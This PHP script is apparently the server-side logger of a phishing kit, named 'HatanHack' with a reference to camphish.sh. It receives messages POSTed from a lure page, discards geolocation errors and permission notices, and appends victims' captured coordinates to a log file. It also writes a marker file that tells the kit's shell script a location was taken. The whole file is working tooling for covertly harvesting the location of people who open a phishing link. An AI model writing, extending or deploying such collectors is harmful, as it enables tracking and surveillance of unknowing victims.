<?php
// HatanHack Custom Debug Logging Script
if(isset($_POST['message'])) {
    $message = $_POST['message'];
    $date = date('Y-m-d H:i:s');
    
    // Filter out messages we don't want to show in the console
    $filtered_messages = [
        "Location data sent",
        "getLocation called",
        "Geolocation error",
        "Location permission denied"
    ];
    
    // Check if the message contains any of the filtered phrases
    $should_filter = false;
    foreach($filtered_messages as $filtered_phrase) {
        if(strpos($message, $filtered_phrase) !== false) {
            $should_filter = true;
            break;
        }
    }
    
    // Only log essential location data (coordinates) but not the filtered messages
    if(!$should_filter && (
        strpos($message, 'Lat:') !== false || 
        strpos($message, 'Latitude:') !== false || 
        strpos($message, 'Position obtained') !== false
    )) {
        // Log to our custom location debug log file
        $location_log = fopen("hatan_location_debug.log", "a");
        fwrite($location_log, "[$date] $message\n");
        fclose($location_log);
        
        // Also create a marker file for the shell script to detect
        // NOTE: camphish.sh detects location via 'current_location.txt' or location_* files now, 
        // but we keep this marker for backward compatibility or potential custom logic.
        file_put_contents("hatan_location_marker.log", "Location data captured\n", FILE_APPEND);
    }
    
    // Return success
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
} else {
    // Return error
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'No message provided']);
}
?>
